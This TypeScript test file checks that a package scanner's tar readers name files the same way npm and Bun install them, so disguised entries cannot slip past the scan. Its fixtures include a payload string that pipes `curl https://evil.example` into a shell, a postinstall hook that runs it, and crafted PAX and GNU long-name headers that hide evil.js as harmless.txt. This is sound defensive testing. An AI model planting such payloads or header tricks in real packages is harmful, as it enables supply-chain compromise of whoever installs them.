// Where npm (node-tar) and Bun (libarchive) read a tar header one way and apm read it another, a file could install under
// a path apm never scanned, or not be scanned at all. Each case here was extracted with npm and with `bun install` and
// lists what both put on disk; readTar and TarStream must read the same files, or refuse the archive.
import { describe, expect, test } from "bun:test";
import { ArchiveError, readTar, TarStream, type TarEntry } from "../src/index.ts";

const enc = new TextEncoder();

function header(o: { name: string; size: number; type?: string; magic?: string; prefix?: string }): Uint8Array {
  const h = new Uint8Array(512);
  const put = (s: string, at: number): void => h.set(enc.encode(s), at);
  put(o.name, 0);
  put("0000644\0", 100);
  put("0000000\0", 108);
  put("0000000\0", 116);
  put(`${o.size.toString(8).padStart(11, "0")}\0`, 124);
  put("00000000000\0", 136);
  put("        ", 148);
  put(o.type ?? "0", 156);
  put(o.magic ?? "ustar\x0000", 257);

  if (o.prefix !== undefined) put(o.prefix, 345);
  put(`${h.reduce((n, b) => n + b, 0).toString(8).padStart(6, "0")}\0 `, 148);

  return h;
}

function entry(name: string, body: string, o: { type?: string; magic?: string; prefix?: string } = {}): Uint8Array[] {
  const data = enc.encode(body);

  return [header({ name, size: data.length, ...o }), data, new Uint8Array((512 - (data.length % 512)) % 512)];
}

function paxRecord(kv: string): string {
  let len = kv.length + 3;

  while (`${len} ${kv}\n`.length !== len) len = `${len} ${kv}\n`.length;

  return `${len} ${kv}\n`;
}

const zero = (): Uint8Array => new Uint8Array(512);

function tar(parts: Uint8Array[][]): Uint8Array {
  const all = [...parts.flat(), zero(), zero()];
  const out = new Uint8Array(all.reduce((n, p) => n + p.length, 0));
  let at = 0;

  for (const p of all) {
    out.set(p, at);
    at += p.length;
  }

  return out;
}

const PJ = entry("package/package.json", '{"name":"x","version":"1.0.0","scripts":{"postinstall":"node evil.js"}}');
const EVIL = "require('child_process').exec('curl https://evil.example | sh')";
const LONG = `package/${"d/".repeat(60)}evil.js`;

function streamed(bytes: Uint8Array): TarEntry[] {
  const t = new TarStream(() => "hold");

  // odd chunks, so a header is cut across pushes
  for (let at = 0; at < bytes.length; at += 333) t.push(bytes.subarray(at, at + 333));

  return t.end().files;
}

const pathsOf = (files: readonly TarEntry[]): string[] => files.map((f) => f.path);

describe("tar headers are read as npm and Bun install them", () => {
  const cases: { name: string; bytes: Uint8Array; installed: string[] }[] = [
    { name: "one zero block is passed over; two end the archive", bytes: tar([PJ, [zero()], entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a GNU header's prefix bytes are not a path prefix", bytes: tar([PJ, entry("package/evil.js", EVIL, { magic: "ustar  \0", prefix: "zzz" })]), installed: ["package.json", "evil.js"] },
    { name: "a v7 header's prefix bytes are not a path prefix", bytes: tar([PJ, entry("package/evil.js", EVIL, { magic: "", prefix: "zzz" })]), installed: ["package.json", "evil.js"] },
    { name: "a ustar header's prefix is", bytes: tar([PJ, entry("a.js", "x", { prefix: "package/lib" })]), installed: ["package.json", "lib/a.js"] },
    { name: "a GNU long link name leaves the pending long name in place", bytes: tar([PJ, entry("././@LongLink", `${LONG}\0`, { type: "L" }), entry("././@LongLink", "target\0", { type: "K" }), entry("package/short.js", EVIL)]), installed: ["package.json", LONG.slice("package/".length)] },
    { name: "an old-style X PAX header names the next file", bytes: tar([PJ, entry("PaxHeader/a.js", paxRecord("path=package/evil.js"), { type: "X" }), entry("package/a.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a global PAX header's path names no file", bytes: tar([PJ, entry("pax_global_header", paxRecord("path=package/other.js"), { type: "g" }), entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    // the later of a PAX path and a GNU long name names the file, whichever order they come in: reading the PAX path first
    // listed this evil.js as harmless.txt, a file the scan skips
    { name: "a GNU long name after a PAX path names the file", bytes: tar([PJ, entry("PaxHeader/a", paxRecord("path=package/harmless.txt"), { type: "x" }), entry("././@LongLink", "package/evil.js\0", { type: "L" }), entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a GNU long name after an old-style X PAX path names the file", bytes: tar([PJ, entry("PaxHeader/a", paxRecord("path=package/harmless.txt"), { type: "X" }), entry("././@LongLink", "package/evil.js\0", { type: "L" }), entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a PAX path after a GNU long name names the file", bytes: tar([PJ, entry("././@LongLink", "package/harmless.txt\0", { type: "L" }), entry("PaxHeader/a", paxRecord("path=package/evil.js"), { type: "x" }), entry("package/harmless.txt", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a PAX header that sets no path leaves a GNU long name in place", bytes: tar([PJ, entry("././@LongLink", "package/evil.js\0", { type: "L" }), entry("PaxHeader/a", paxRecord("mtime=1"), { type: "x" }), entry("package/harmless.txt", EVIL)]), installed: ["package.json", "evil.js"] },
  ];

  for (const c of cases) {
    test(c.name, () => {
      expect(pathsOf(readTar(c.bytes))).toEqual(c.installed);
      expect(pathsOf(streamed(c.bytes))).toEqual(c.installed);
    });
  }

  // npm merges a PAX header that sets no path over the one before it, so the earlier path names the file; Bun refuses two
  // PAX headers in a row. Reading the header's own name would list harmless.txt for what npm installs as evil.js
  test("a PAX header that sets no path leaves an earlier PAX path in place", () => {
    const bytes = tar([PJ, entry("PaxHeader/a", paxRecord("path=package/evil.js"), { type: "x" }), entry("PaxHeader/a", paxRecord("mtime=1"), { type: "x" }), entry("package/harmless.txt", EVIL)]);

    expect(pathsOf(readTar(bytes))).toEqual(["package.json", "evil.js"]);
    expect(pathsOf(streamed(bytes))).toEqual(["package.json", "evil.js"]);
  });

  test("the file after a lone zero block is read whole", () => {
    const [, evil] = readTar(tar([PJ, [zero()], entry("package/evil.js", EVIL)]));

    expect(new TextDecoder().decode(evil?.data)).toBe(EVIL);
  });

  // npm gives the next entry the PAX size, so the header's size would read every later entry at other bytes: here npm
  // installs a.js as 1024 bytes holding b.js's header, where the header's size reads a.js empty and b.js apart. Bun
  // agrees with npm for an "x" header and not for a "g" one, so neither reading is the installed one: refused
  for (const type of ["x", "g"]) {
    test(`a ${type} PAX header that sets a size is refused`, () => {
      const bytes = tar([PJ, entry("PaxHeader/a.js", paxRecord("size=1024"), { type }), entry("package/a.js", ""), entry("package/b.js", "b")]);

      expect(() => readTar(bytes)).toThrow(ArchiveError);
      expect(() => streamed(bytes)).toThrow(ArchiveError);
    });
  }
});
